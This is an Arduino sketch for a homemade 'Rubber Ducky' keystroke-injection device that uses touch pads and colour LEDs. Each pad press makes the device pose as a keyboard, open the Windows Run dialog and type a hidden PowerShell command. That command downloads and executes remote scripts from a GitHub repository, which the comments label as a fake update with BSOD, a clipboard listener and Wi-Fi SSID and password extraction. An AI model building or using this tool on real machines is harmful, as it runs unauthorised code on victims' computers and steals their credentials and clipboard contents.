#include <Adafruit_NeoPixel.h>
#include "Adafruit_FreeTouch.h"
#include "Keyboard.h"

// Create the neopixel strip with the built in definitions NUM_NEOPIXEL and PIN_NEOPIXEL
Adafruit_NeoPixel strip = Adafruit_NeoPixel(NUM_NEOPIXEL, PIN_NEOPIXEL, NEO_GRB + NEO_KHZ800);

// Create the two touch pads on pins 1 and 2:
Adafruit_FreeTouch qt_1 = Adafruit_FreeTouch(1, OVERSAMPLE_4, RESISTOR_50K, FREQ_MODE_NONE);
Adafruit_FreeTouch qt_2 = Adafruit_FreeTouch(2, OVERSAMPLE_4, RESISTOR_50K, FREQ_MODE_NONE);

// Define colors
unsigned long PINK = 0xad1db5;
unsigned long BLUE = 0x0011ff;
unsigned long ORANGE = 0xff6a00;
unsigned long GREEN = 0x00ff3c;
unsigned long RED = 0xFF0000;


void setup() 
{
  Serial.begin(9600);
  strip.begin(); // Start pixels
  strip.setBrightness(20); // Lower brightness
  strip.show(); // Initialize all pixels to 'off'

  if (! qt_1.begin())  
    Serial.println("Failed to begin qt on pin 1");
  if (! qt_2.begin())  
    Serial.println("Failed to begin qt on pin 2");
    
  // Begin keyboard
  Keyboard.begin();
  Keyboard.print("0");
  delay(500);
}

void loop() 
{
  // Get values from capacitive touch pads
  uint16_t touch1 = qt_1.measure();
  uint16_t touch2 = qt_2.measure();

  // Set colors
  strip.setPixelColor(0, PINK);
  strip.setPixelColor(1, BLUE);
  strip.setPixelColor(2, ORANGE);
  strip.setPixelColor(3, GREEN);
  strip.show();
  
  if (touch1 > 500) 
  {
    delay(200);
    touch1 = qt_1.measure();
    
    if(touch1 > 500) // Long press
    {
        delay(200); // Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
        setAll(GREEN);
        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload4.ps1"); // Wallpaper change + Youtube tripwire
        allOff();
    }
    else // Short press
    {
        setAll(ORANGE);
        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload3.ps1"); // Fake Update + BSOD
        allOff();
    }
  }
  
  else if(touch2 > 500)
  {
    delay(200);
    touch2 = qt_2.measure();
    
    if(touch2 > 500) // Long press
    {
        delay(200); // Delay to prevent accidentally sending command in case device is pulled out while touching capacitive pad
        setAll(PINK);
        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload5.ps1"); // Clipboard listener
        allOff();
    }
    else // Short press
    {
        setAll(BLUE);
        runCommand("https://raw.githubusercontent.com/BrianJ-4/DIY-RubberDucky-Scripts/main/payload6.ps1"); // SSID and pass extract
        allOff();
    }
  }
  delay(100);
}

void setAll(unsigned long COLOR)
{
  strip.setPixelColor(0, COLOR);
  strip.setPixelColor(1, COLOR);
  strip.setPixelColor(2, COLOR);
  strip.setPixelColor(3, COLOR);
  strip.show();
}

void allOff()
{
  strip.setPixelColor(0, 0x0);
  strip.setPixelColor(1, 0x0);
  strip.setPixelColor(2, 0x0);
  strip.setPixelColor(3, 0x0);  
  strip.show();
}

// Run powershell script from Github
void runCommand(String url)
{
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_DELETE);
    Keyboard.releaseAll();
    Keyboard.print("powershell -w h ");
    Keyboard.print("iex (irm \"");
    Keyboard.print(url);
    Keyboard.print("\")");
    Keyboard.write(KEY_RETURN);
}
